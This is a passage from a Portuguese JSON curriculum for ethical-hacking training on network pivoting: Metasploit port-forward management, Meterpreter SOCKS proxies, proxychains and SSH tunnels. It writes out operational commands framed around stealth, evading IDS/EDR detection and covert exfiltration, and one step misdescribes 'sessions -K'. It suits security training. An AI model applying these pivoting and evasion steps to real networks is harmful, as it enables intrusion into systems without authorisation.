                                    "Limpe: feche túneis e ports para stealth."
                                  ],
                                  "verification": "Relatório completo explica sucessos/falhas com evidências e ações corretivas aplicadas.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Editor de texto para relatório",
                                    "Ferramentas de log (script ou tee)"
                                  ],
                                  "tips": "Automatize com script bash: combine nmap + nc em loop para ports múltiplas.",
                                  "learningObjective": "Interpretar resultados de testes para validar pivoting efetivo em cenários reais.",
                                  "commonMistakes": [
                                    "Atribuir falha ao túnel sem checar rede local",
                                    "Deixar portas abertas pós-teste",
                                    "Relatório vago sem evidências"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de pentest com Metasploitable pivô (192.168.1.100), forwarde porta 80 interna para localhost:8080 via 'ssh -L 8080:192.168.1.100:80 user@pivo'. No atacante: 'nmap -p 8080 localhost' mostra Apache open; 'telnet localhost 8080' retorna HTTP banner, confirmando acesso ao web server interno via pivô.",
                              "finalVerifications": [
                                "Todas portas forwardadas reportadas como open no nmap.",
                                "Telnet/nc conecta com resposta válida do serviço interno.",
                                "Ausência de erros/timeouts em logs de túnel e scans.",
                                "Latência aceitável (<5s por conexão).",
                                "Relatório documentado com outputs e screenshots.",
                                "Túnel fechado sem vestígios persistentes."
                              ],
                              "assessmentCriteria": [
                                "Execução precisa de comandos nmap/telnet sem sintaxe erros.",
                                "Interpretação correta de outputs (open vs filtered).",
                                "Troubleshooting eficaz de falhas comuns (firewall/túnel).",
                                "Documentação completa e organizada.",
                                "Eficiência temporal dentro dos estimates.",
                                "Segurança: testes stealth sem exposição desnecessária."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de TCP/IP, portas e NAT/port forwarding.",
                                "Sistemas Operacionais: Gerenciamento de processos, netstat/ss e firewalls (iptables).",
                                "Programação: Automação de scans com Bash/Python (ex: nmap scripts).",
                                "Análise de Dados: Interpretação de logs e métricas de performance.",
                                "Ética em TI: Princípios de ethical hacking e chain of custody em relatórios."
                              ],
                              "realWorldApplication": "Em penetration tests reais (ex: Red Team ops), valida acesso a serviços internos (SMB, RDP) via pivô comprometido, permitindo exploração further sem detecção direta, comum em assessments de redes segmentadas empresariais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.1.3",
                            "name": "Gerenciar e Remover Túnel de Port Forwarding",
                            "description": "Aplicar comandos como 'portfwd delete' ou 'portfwd list' para monitorar, modificar ou remover túneis ativos, garantindo limpeza e evitando detecção.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Listar Túneis de Port Forwarding Ativos",
                                  "subSteps": [
                                    "Acesse o console da ferramenta de ethical hacking (ex: msfconsole no Metasploit).",
                                    "Execute o comando 'portfwd list' para exibir todos os túneis ativos.",
                                    "Analise a saída para identificar colunas como LHOST, LPORT, RHOST e RPORT.",
                                    "Registre os IDs dos túneis relevantes em um arquivo de notas.",
                                    "Repita o comando para monitorar mudanças em tempo real."
                                  ],
                                  "verification": "A saída do 'portfwd list' mostra uma lista formatada de túneis sem erros de sintaxe.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Kali Linux ou máquina virtual com Metasploit instalado",
                                    "Túnel de port forwarding ativo no ambiente de laboratório",
                                    "Terminal SSH para acesso ao pivô"
                                  ],
                                  "tips": "Use 'portfwd list | grep <keyword>' para filtrar túneis específicos e economizar tempo.",
                                  "learningObjective": "Compreender como visualizar e interpretar túneis ativos para monitoramento eficaz.",
                                  "commonMistakes": [
                                    "Executar comando sem estar no módulo correto do Metasploit",
                                    "Ignorar a necessidade de contexto de sessão ativa",
                                    "Não anotar IDs antes de prosseguir"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Selecionar Túnel para Gerenciamento",
                                  "subSteps": [
                                    "Revise a lista gerada no passo anterior e identifique o túnel pelo ID, LPORT ou destino.",
                                    "Verifique o propósito do túnel consultando logs de sessão ou documentação do pentest.",
                                    "Decida se modificar (ex: 'portfwd edit') ou remover com base em critérios de OPSEC.",
                                    "Documente a razão da ação (ex: evitar detecção por tráfego desnecessário).",
                                    "Confirme com 'portfwd list' para validar seleção."
                                  ],
                                  "verification": "Túnel alvo identificado corretamente com ID anotado e razão documentada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Lista de túneis do passo 1",
                                    "Ferramentas de log como Wireshark para verificação opcional",
                                    "Notebook para documentação"
                                  ],
                                  "tips": "Priorize túneis com tráfego alto ou expostos para remoção imediata visando stealth.",
                                  "learningObjective": "Desenvolver habilidades de análise para decisões informadas em gerenciamento de túneis.",
                                  "commonMistakes": [
                                    "Selecionar túnel errado por confusão de IDs",
                                    "Não considerar impacto em pivots dependentes",
                                    "Pular documentação de razões"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Remoção do Túnel Específico",
                                  "subSteps": [
                                    "Use o comando 'portfwd delete <ID>' substituindo <ID> pelo número do túnel alvo.",
                                    "Confirme a execução observando mensagem de sucesso no console.",
                                    "Se aplicável, execute 'portfwd edit <ID>' para modificações antes da remoção final.",
                                    "Monitore logs do sistema pivô para erros de rede durante a remoção.",
                                    "Salve a configuração atual com 'sessions -K' se necessário para persistência."
                                  ],
                                  "verification": "Comando executado retorna confirmação de deleção sem erros.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Console Metasploit ativo",
                                    "ID do túnel do passo 2",
                                    "Ambiente de lab com rede isolada"
                                  ],
                                  "tips": "Sempre teste em lab antes de produção; use 'portfwd add' para recriar se precisar restaurar.",
                                  "learningObjective": "Mastar comandos de remoção para limpeza segura de recursos de pivoting.",
                                  "commonMistakes": [
                                    "Sintaxe errada como 'deleteportfwd'",
                                    "Remover túnel crítico sem backup",
                                    "Não monitorar logs pós-remoção"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Limpeza e Evitar Detecção",
                                  "subSteps": [
                                    "Execute 'portfwd list' novamente para confirmar ausência do túnel removido.",
                                    "Teste conectividade no destino removido (ex: telnet LHOST LPORT deve falhar).",
                                    "Inspecione tráfego de rede com tcpdump ou Wireshark para ausência de forwarding.",
                                    "Documente o antes/depois em relatório de OPSEC.",
                                    "Repita monitoramento por 5 minutos para detectar regenerações automáticas."
                                  ],
                                  "verification": "'portfwd list' vazio para túneis alvo e testes de conectividade falham.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramentas de monitoramento: tcpdump, Wireshark",
                                    "Relatório template para OPSEC"
                                  ],
                                  "tips": "Automatize verificações com script bash para eficiência em cenários múltiplos.",
                                  "learningObjective": "Garantir limpeza completa e práticas de evasão de detecção.",
                                  "commonMistakes": [
                                    "Assumir remoção sem verificação dupla",
                                    "Ignorar tráfego persistente em cache",
                                    "Não documentar para auditoria"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de pentest simulando ataque a rede corporativa, após pivotar via SSH para host interno (ID 2: LPORT 8080 -> RHOST 192.168.1.100:80), execute 'portfwd list' (mostra ID 2 ativo), então 'portfwd delete 2'. Verifique com 'portfwd list' (ausente) e telnet 127.0.0.1 8080 (falha), garantindo que scanners de rede não detectem o túnel legado.",
                              "finalVerifications": [
                                "Lista de túneis vazia ou sem itens alvo após remoção.",
                                "Testes de conectividade para ports forward falham consistentemente.",
                                "Logs de rede mostram ausência de tráfego relacionado ao túnel.",
                                "Documentação completa de ações e razões incluída.",
                                "Nenhuma regeneração automática detectada em monitoramento de 10 minutos.",
                                "Explicação verbal correta do processo de gerenciamento."
                              ],
                              "assessmentCriteria": [
                                "Execução precisa de comandos sem erros de sintaxe (100% sucesso).",
                                "Análise correta de túneis com justificativa OPSEC documentada.",
                                "Verificação completa com múltiplos métodos (list, connect, network).",
                                "Tempo total dentro de 80 minutos com eficiência.",
                                "Identificação e correção de pelo menos um erro comum simulado.",
                                "Relatório final claro e profissional."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de NAT, port forwarding e protocolos TCP/UDP.",
                                "Sistemas Operacionais: Comandos Linux shell e gerenciamento de processos de rede.",
                                "Programação: Automação via scripts Python/ Bash para gerenciamento de sessões.",
                                "Ética e Direito: Práticas de OPSEC em ethical hacking e conformidade legal.",
                                "Análise de Dados: Interpretação de logs e monitoramento de tráfego."
                              ],
                              "realWorldApplication": "Em operações de Red Team durante jogos de guerra cibernética, gerenciar e remover túneis de port forwarding previne detecção por IDS/IPS, permitindo extração limpa de dados e exfiltração stealth em ambientes corporativos reais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.2.2",
                        "name": "Pivoting via SOCKS Proxy",
                        "description": "Método que transforma o host comprometido em um proxy SOCKS dinâmico, permitindo roteamento de tráfego de ferramentas como nmap ou browsers para redes internas sem configuração manual de portas.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.2.2.1",
                            "name": "Ativar SOCKS Proxy no Meterpreter",
                            "description": "Executar o comando 'background' seguido de 'use auxiliary/server/socks_proxy' ou diretamente no Meterpreter com 'run autoroute' e ativar proxy SOCKS4a/SOCKS5 para pivoting.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar a Sessão Meterpreter",
                                  "subSteps": [
                                    "Inicie o Metasploit Framework com 'msfconsole'.",
                                    "Carregue uma sessão Meterpreter ativa usando 'sessions -i <ID>' para interagir.",
                                    "Execute 'background' para enviar a sessão ao fundo, liberando o console principal.",
                                    "Verifique sessões ativas com 'sessions -l' para confirmar o ID da sessão Meterpreter.",
                                    "Certifique-se de que a sessão está estável e responsiva."
                                  ],
                                  "verification": "Sessão listada em 'sessions -l' e comando 'sessions -i <ID>' responde sem erros.",
                                  "estimatedTime": "5 minutes",
                                  "materials": [
                                    "Metasploit Framework instalado",
                                    "Sessão Meterpreter ativa em ambiente de lab"
                                  ],
                                  "tips": "Use sessões em labs isolados para evitar impactos reais; sempre documente o ID da sessão.",
                                  "learningObjective": "Compreender o gerenciamento de sessões no Metasploit para operações multi-etapa.",
                                  "commonMistakes": [
                                    "Esquecer de background, travando o console",
                                    "Usar sessão instável ou expirada"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Carregar e Configurar o Módulo SOCKS Proxy",
                                  "subSteps": [
                                    "Digite 'use auxiliary/server/socks_proxy' para carregar o módulo.",
                                    "Execute 'show options' para visualizar configurações necessárias.",
                                    "Defina 'SRVHOST 0.0.0.0' para escutar em todas as interfaces locais.",
                                    "Defina 'SRVPORT 1080' (porta padrão para SOCKS).",
                                    "Opcionalmente, defina 'VERSION 5' para SOCKS5 ou '4a' para SOCKS4a."
                                  ],
                                  "verification": "Comando 'show options' exibe SRVHOST e SRVPORT configurados corretamente.",
                                  "estimatedTime": "10 minutes",
                                  "materials": [
                                    "Msfconsole aberto",
                                    "Documentação Metasploit para módulos auxiliary"
                                  ],
                                  "tips": "Use SOCKS5 para suporte a autenticação; teste portas alternativas se 1080 estiver em uso.",
                                  "learningObjective": "Dominar a configuração de módulos auxiliary no Metasploit para proxies.",
                                  "commonMistakes": [
                                    "Não definir SRVHOST corretamente",
                                    "Ignorar conflitos de porta"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar o SOCKS Proxy",
                                  "subSteps": [
                                    "Execute 'exploit' ou 'run' para iniciar o proxy SOCKS.",
                                    "Confirme a mensagem de sucesso: 'SOCKS proxy server started'.",
                                    "Anote o endereço e porta de escuta (ex: 127.0.0.1:1080).",
                                    "Em outra sessão Meterpreter, execute 'run autoroute -s <subnet>' para rotas se necessário.",
                                    "Monitore jobs com 'jobs' para ver o proxy rodando."
                                  ],
                                  "verification": "Job listado em 'jobs' como 'running' e sem erros no console.",
                                  "estimatedTime": "5 minutes",
                                  "materials": [
                                    "Sessão Meterpreter backgrounded",
                                    "Conhecimento de sub-redes para autoroute"
                                  ],
                                  "tips": "Combine com autoroute para pivoting efetivo; use 'jobs -K' para kill se precisar parar.",
                                  "learningObjective": "Executar proxies SOCKS para tunelamento de tráfego em pivoting.",
                                  "commonMistakes": [
                                    "Executar sem autoroute, falhando no pivoting",
                                    "Porta bloqueada por firewall"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar e Testar o Proxy",
                                  "subSteps": [
                                    "Use 'netstat -tlnp | grep 1080' no host local para confirmar escuta.",
                                    "Configure proxychains ou similar com 'socks5 127.0.0.1 1080'.",
                                    "Teste conectividade: 'proxychains nmap <target_interna>'.",
                                    "Verifique logs do Metasploit para tráfego roteado.",
                                    "Pare o proxy com 'jobs -K <job_id>' após testes."
                                  ],
                                  "verification": "Tráfego de teste roteia via proxy sem erros; nmap acessa hosts pivotados.",
                                  "estimatedTime": "10 minutes",
                                  "materials": [
                                    "Proxychains instalado",
                                    "Ambiente de lab com rede pivotável"
                                  ],
                                  "tips": "Teste em labs com múltiplas sub-redes; monitore CPU/uso de rede.",
                                  "learningObjective": "Validar funcionalidade de pivoting via SOCKS para operações avançadas.",
                                  "commonMistakes": [
                                    "Configurar proxychains errado",
                                    "Testar sem autoroute ativo"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de pentest, com Meterpreter em 192.168.1.10 (máquina comprometida), background a sessão, configure SOCKS em 1080, execute autoroute para 10.0.0.0/24, e use proxychains nmap para scanear hosts internos via proxy.",
                              "finalVerifications": [
                                "Proxy SOCKS inicia sem erros e job roda estável.",
                                "Netstat confirma porta 1080 escutando.",
                                "Proxychains roteia tráfego corretamente para rede pivotada.",
                                "Autoroute adiciona rotas visíveis em 'route print'.",
                                "Testes de conectividade (ping/nmap) funcionam via proxy.",
                                "Logs Metasploit mostram tráfego SOCKS."
                              ],
                              "assessmentCriteria": [
                                "Configurações precisas do módulo sem prompts de erro.",
                                "Execução bem-sucedida com verificação imediata de job.",
                                "Teste prático demonstra pivoting efetivo.",
                                "Identificação e correção de erros comuns.",
                                "Explicação clara do fluxo background -> proxy -> test.",
                                "Uso ético em ambiente controlado."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de TCP/IP, roteamento e proxies.",
                                "Sistemas Operacionais: Comandos Linux netstat/proxychains.",
                                "Programação: Scripts para automação Metasploit.",
                                "Ética: Princípios de ethical hacking e regras de engajamento.",
                                "Análise de Segurança: Logs e monitoramento de tráfego."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou pentests autorizados, permite pivoting sigiloso através de firewalls/NAT, acessando redes internas segmentadas sem detecção direta, essencial para simulações de ataques avançados persistentes (APT)."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.2.2",
                            "name": "Configurar Proxychains para Usar SOCKS Proxy",
                            "description": "Editar o arquivo de configuração do proxychains para apontar para o proxy SOCKS no host pivô (ex: 127.0.0.1:1080) e executar scans como 'proxychains nmap -sT target'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Verificar e Instalar Proxychains",
                                  "subSteps": [
                                    "Abra o terminal em um ambiente Linux (ex: Kali Linux).",
                                    "Execute 'proxychains -h' para verificar se está instalado.",
                                    "Se não estiver, atualize os repositórios com 'sudo apt update'.",
                                    "Instale com 'sudo apt install proxychains'.",
                                    "Confirme a instalação executando 'which proxychains'."
                                  ],
                                  "verification": "Comando 'proxychains -h' exibe a ajuda sem erros.",
                                  "estimatedTime": "10 minutes",
                                  "materials": [
                                    "Terminal Linux",
                                    "Acesso root/sudo"
                                  ],
                                  "tips": "Use Kali Linux para ambientes de ethical hacking.",
                                  "learningObjective": "Entender pré-requisitos e instalação de ferramentas de proxy chaining.",
                                  "commonMistakes": [
                                    "Esquecer de usar sudo para instalação",
                                    "Não atualizar repositórios antes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar e Fazer Backup do Arquivo de Configuração",
                                  "subSteps": [
                                    "Localize o arquivo com 'locate proxychains.conf' ou verifique /etc/proxychains.conf.",
                                    "Copie o arquivo original: 'sudo cp /etc/proxychains.conf /etc/proxychains.conf.bak'.",
                                    "Verifique o backup: 'ls -la /etc/proxychains.conf*'.",
                                    "Abra o editor: 'sudo nano /etc/proxychains.conf'.",
                                    "Revise a seção [ProxyList] no final do arquivo."
                                  ],
                                  "verification": "Arquivo de backup existe e original pode ser editado.",
                                  "estimatedTime": "5 minutes",
                                  "materials": [
                                    "Editor de texto (nano/vim)",
                                    "Comando locate (instale mlocate se necessário)"
                                  ],
                                  "tips": "Sempre faça backup antes de editar configs de sistema.",
                                  "learningObjective": "Aprender boas práticas de edição de configurações de sistema.",
                                  "commonMistakes": [
                                    "Editar sem backup",
                                    "Usar caminho errado (/usr/share/proxychains.conf em algumas distros)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Editar a Configuração para SOCKS Proxy",
                                  "subSteps": [
                                    "Na seção [ProxyList], comente proxies existentes adicionando # no início das linhas.",
                                    "Adicione a linha: 'socks5 127.0.0.1 1080' (ajuste porta/host do pivô).",
                                    "Certifique-se de que dynamic_chain está ativado na seção superior.",
                                    "Salve e saia do editor (Ctrl+O, Enter, Ctrl+X no nano).",
                                    "Valide sintaxe abrindo novamente e checando."
                                  ],
                                  "verification": "Arquivo editado contém 'socks5 127.0.0.1 1080' sem erros de sintaxe.",
                                  "estimatedTime": "10 minutes",
                                  "materials": [
                                    "Editor de texto",
                                    "SOCKS proxy rodando no pivô (ex: ssh -D 1080)"
                                  ],
                                  "tips": "Use socks4 ou socks5 conforme o proxy; teste proxy primeiro com curl.",
                                  "learningObjective": "Configurar proxychains para rotear tráfego via SOCKS no pivô.",
                                  "commonMistakes": [
                                    "Esquecer de comentar outros proxies",
                                    "Porta/host incorretos",
                                    "Não salvar arquivo"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar a Configuração com Nmap",
                                  "subSteps": [
                                    "Execute 'proxychains nmap -sT 127.0.0.1' para teste local.",
                                    "Teste target remoto: 'proxychains nmap -sT target_ip'.",
                                    "Monitore logs do proxy pivô para confirmar tráfego.",
                                    "Se falhar, verifique erros no terminal e ajuste config.",
                                    "Rode 'proxychains curl ifconfig.me' para verificar IP de saída."
                                  ],
                                  "verification": "Nmap completa scan sem erros e tráfego passa pelo proxy.",
                                  "estimatedTime": "15 minutes",
                                  "materials": [
                                    "Nmap instalado",
                                    "Proxy SOCKS ativo no pivô",
                                    "Target acessível"
                                  ],
                                  "tips": "Use -sT para TCP connect scan, menos ruidoso.",
                                  "learningObjective": "Validar pivoting via proxychains em cenários reais.",
                                  "commonMistakes": [
                                    "Proxy não rodando",
                                    "Firewall bloqueando",
                                    "Target inacessível"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de pentest: Inicie SSH dynamic forward 'ssh -D 1080 user@pivo_host'. Edite proxychains.conf para 'socks5 127.0.0.1 1080'. Rode 'proxychains nmap -sT 10.10.10.50' para scanear host interno via pivô, confirmando portas abertas sem exposição direta.",
                              "finalVerifications": [
                                "proxychains nmap executa sem crashes ou erros de proxy.",
                                "Tráfego de saída confirmado via logs do proxy pivô.",
                                "IP de saída muda ao usar 'proxychains curl ifconfig.me'.",
                                "Scan revela hosts/portas acessíveis apenas via pivô.",
                                "Configuração persiste após reboot (se aplicável)."
                              ],
                              "assessmentCriteria": [
                                "Arquivo proxychains.conf corretamente editado com SOCKS entry.",
                                "Testes de conectividade via proxychains bem-sucedidos.",
                                "Identificação e correção de erros comuns durante configuração.",
                                "Compreensão de chain types (strict/dynamic) e impactos.",
                                "Aplicação em cenário de pivoting simulado."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Conceitos de SOCKS protocol e tunneling.",
                                "Sistemas Operacionais: Edição de configs Linux e comandos sudo.",
                                "Programação: Scripts para automação de proxychains.",
                                "Ética em Segurança: Uso responsável em ethical hacking."
                              ],
                              "realWorldApplication": "Durante red team engagements ou pentests, permite scans e exploits em redes internas via pivô comprometido, mantendo anonimato e evitando detecção direta do atacante."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.2.3",
                            "name": "Monitorar e Otimizar Tráfego SOCKS",
                            "description": "Usar ferramentas como Wireshark no atacante para monitorar tráfego roteado via SOCKS e otimizar configurações para reduzir latência em operações de pivoting extensas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Monitoramento com Wireshark e SOCKS Proxy",
                                  "subSteps": [
                                    "Instale e configure o Wireshark no sistema atacante (Kali Linux recomendado).",
                                    "Configure o SOCKS proxy usando ferramentas como Proxychains ou SSH -D para rotear tráfego.",
                                    "Defina filtros iniciais no Wireshark para capturar apenas tráfego SOCKS (ex: tcp.port == 1080).",
                                    "Inicie uma sessão de pivoting básica de um host pivô para um target via SOCKS.",
                                    "Verifique conectividade básica enviando pacotes de teste (ping ou nmap scan)."
                                  ],
                                  "verification": "Confirme que o Wireshark está capturando tráfego roteado via SOCKS sem erros de filtro.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Wireshark",
                                    "Proxychains ou SSH",
                                    "Ambiente de lab com VMs (Attacker, Pivot, Target)"
                                  ],
                                  "tips": "Use interface de rede correta no Wireshark para evitar captura de tráfego local desnecessário.",
                                  "learningObjective": "Entender a integração entre Wireshark e proxies SOCKS para monitoramento inicial.",
                                  "commonMistakes": [
                                    "Selecionar interface errada",
                                    "Não ativar promiscuous mode",
                                    "Filtros muito restritivos no início"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Capturar e Analisar Tráfego SOCKS em Operações de Pivoting",
                                  "subSteps": [
                                    "Execute comandos de pivoting extenso (ex: nmap -sV em rede target via proxychains).",
                                    "Inicie captura no Wireshark com filtros SOCKS e salve o pcap.",
                                    "Analise estatísticas: latência (RTT), throughput, retransmissões e overhead SOCKS.",
                                    "Identifique padrões de tráfego: headers SOCKS, encapsulamento e autenticação.",
                                    "Exporte gráficos de tempo-resposta para visualização."
                                  ],
                                  "verification": "Gere relatório Wireshark mostrando pelo menos 100 pacotes SOCKS com métricas de latência calculadas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Wireshark com plugins IO Graph",
                                    "Proxychains config",
                                    "Scripts de teste Nmap"
                                  ],
                                  "tips": "Pause captura periodicamente para evitar arquivos pcap muito grandes; use tshark para automação.",
                                  "learningObjective": "Dominar análise de tráfego proxy para identificar comportamentos normais vs. anômalos.",
                                  "commonMistakes": [
                                    "Ignorar overhead de autenticação SOCKS5",
                                    "Não calcular RTT corretamente",
                                    "Captura sem baseline"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Gargalos de Latência no Tráfego SOCKS",
                                  "subSteps": [
                                    "Calcule métricas chave: média de latência, jitter, perda de pacotes usando Wireshark Statistics > TCP Stream.",
                                    "Compare com baseline sem proxy para quantificar overhead SOCKS.",
                                    "Analise causas: buffer overflows, MTU mismatch, CPU usage no pivô.",
                                    "Use ferramentas complementares como tcpdump para validação.",
                                    "Documente bottlenecks em um relatório com screenshots."
                                  ],
                                  "verification": "Liste pelo menos 3 gargalos identificados com evidências do pcap (ex: RTT > 200ms).",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Wireshark Expert Information",
                                    "Tcpdump",
                                    "Calculadora de métricas de rede"
                                  ],
                                  "tips": "Filtre por streams específicos para focar em tráfego de pivoting; ative follow TCP stream.",
                                  "learningObjective": "Desenvolver habilidades para diagnosticar performance em proxies dinâmicos.",
                                  "commonMistakes": [
                                    "Confundir latência de rede com overhead proxy",
                                    "Não considerar carga no pivô",
                                    "Análise superficial sem métricas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Otimizar Configurações SOCKS e Verificar Melhorias",
                                  "subSteps": [
                                    "Ajuste configs: aumente buffers no proxychains, use SOCKS5 com autenticação none se possível.",
                                    "Otimize MTU (ex: ifconfig mtu 1400), ative TCP window scaling.",
                                    "Reexecute testes de pivoting e recapture tráfego para comparação.",
                                    "Meça redução de latência (alvo: 20-50% melhoria).",
                                    "Automatize otimizações com scripts e salve config otimizada."
                                  ],
                                  "verification": "Demonstre redução mensurável de latência em novo pcap vs. baseline (ex: RTT de 300ms para 150ms).",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Proxychains.conf editável",
                                    "Scripts bash para testes repetidos",
                                    "Wireshark para diff pcaps"
                                  ],
                                  "tips": "Teste incrementalmente uma mudança por vez para isolar impactos.",
                                  "learningObjective": "Aplicar tuning de performance em cenários de pivoting realistas.",
                                  "commonMistakes": [
                                    "Mudanças radicais sem baseline",
                                    "Ignorar impacto em segurança",
                                    "Não retestar completamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de ethical hacking, configure um pivô Windows comprometido com SSH -D 1080. Use proxychains nmap para scanear uma sub-rede target. Monitore no Wireshark do Kali atacante, identifique latência de 400ms devido a MTU, otimize para 1400 e reduza para 180ms, permitindo scans 2x mais rápidos.",
                              "finalVerifications": [
                                "Tráfego SOCKS capturado e analisado com <10% perda de pacotes.",
                                "Latência reduzida em pelo menos 30% pós-otimização.",
                                "Relatório com pcaps before/after e métricas comparativas.",
                                "Configurações otimizadas salvas e testadas em pivoting extenso.",
                                "Nenhum erro de conexão ou timeout durante operações.",
                                "Gráficos Wireshark mostram throughput estável >1Mbps."
                              ],
                              "assessmentCriteria": [
                                "Precisão na captura e filtros Wireshark (sem falsos positivos).",
                                "Identificação correta de pelo menos 3 gargalos com evidências.",
                                "Efetividade da otimização (redução quantificável de latência).",
                                "Documentação completa com screenshots e métricas.",
                                "Segurança mantida (sem exposição desnecessária do proxy).",
                                "Eficiência temporal (conclusão dentro de 2 horas)."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Protocolos de Rede (TCP/IP, SOCKS5).",
                                "Otimização de Performance em Sistemas (buffering, MTU).",
                                "Ferramentas de Debugging de Rede (tcpdump, tshark).",
                                "Ethical Hacking e Red Teaming (pivoting chains).",
                                "Gestão de Recursos em Ambientes Virtualizados."
                              ],
                              "realWorldApplication": "Em pentests de red team, otimizar SOCKS em pivots multi-hop reduz detecção por EDRs e permite C2 persistente em redes enterprise, simulando APTs reais sem comprometer stealth ou velocidade."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.2.3",
                        "name": "Pivoting via Tunelamento SSH",
                        "description": "Exploração de acessos SSH em hosts comprometidos para criar túneis dinâmicos ou locais, permitindo acesso seguro e reverso a redes segmentadas internas.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.2.3.1",
                            "name": "Criar Túnel SSH Local",
                            "description": "Utilizar 'ssh -L local_port:remote_host:remote_port user@pivot_host' para forwardar portas locais para destinos remotos via pivô SSH.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente e Pré-requisitos",
                                  "subSteps": [
                                    "Verifique se o SSH client está instalado no sistema local (ex: OpenSSH no Linux/Mac ou PuTTY no Windows).",
                                    "Confirme acesso SSH ao pivot_host com credenciais válidas (usuário e senha ou chave SSH).",
                                    "Identifique as portas: escolha uma local_port livre (ex: 8080), remote_host (ex: 192.168.1.100) e remote_port (ex: 80).",
                                    "Configure chaves SSH se necessário: gere par de chaves com 'ssh-keygen' e copie para o pivot_host com 'ssh-copy-id'.",
                                    "Teste conectividade básica: execute 'ssh user@pivot_host' para validar login."
                                  ],
                                  "verification": "Conexão SSH básica ao pivot_host bem-sucedida sem erros de autenticação.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal ou SSH client (OpenSSH/PuTTY)",
                                    "Máquinas virtuais para lab (pivot_host e remote_host)",
                                    "Chaves SSH geradas"
                                  ],
                                  "tips": "Use chaves SSH em vez de senhas para automação e segurança em labs.",
                                  "learningObjective": "Garantir que todos os pré-requisitos de rede e autenticação estejam configurados para pivoting SSH.",
                                  "commonMistakes": [
                                    "Porta local já em uso",
                                    "Firewall bloqueando portas no pivot_host",
                                    "Chaves SSH com permissões incorretas (deve ser 600)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Construir e Entender a Sintaxe do Comando SSH -L",
                                  "subSteps": [
                                    "Analise a sintaxe: 'ssh -L local_port:remote_host:remote_port user@pivot_host'.",
                                    "Defina variáveis: local_port=8080, remote_host=192.168.1.100 (visível do pivot), remote_port=80.",
                                    "Monte o comando completo: 'ssh -L 8080:192.168.1.100:80 user@192.168.1.10' (pivot_host=192.168.1.10).",
                                    "Adicione opções úteis: -f (background), -N (no comando remoto), -i chave_ssh (chave específica).",
                                    "Exemplo final: 'ssh -fN -L 8080:192.168.1.100:80 user@192.168.1.10'."
                                  ],
                                  "verification": "Comando montado corretamente sem erros de sintaxe ao simular 'ssh -L ... -v' (verbose mode).",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Documentação SSH man page ('man ssh')",
                                    "Editor de texto para anotar variáveis"
                                  ],
                                  "tips": "Use -v para debug verbose e identificar problemas de binding de porta.",
                                  "learningObjective": "Dominar a sintaxe exata do forward local e opções comuns para tunelamento SSH.",
                                  "commonMistakes": [
                                    "Confundir ordem: local_port:remote_host:remote_port (remote_host é do ponto de vista do pivot)",
                                    "Esquecer -N causando execução de shell remoto",
                                    "Portas privilegiadas (<1024) sem sudo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
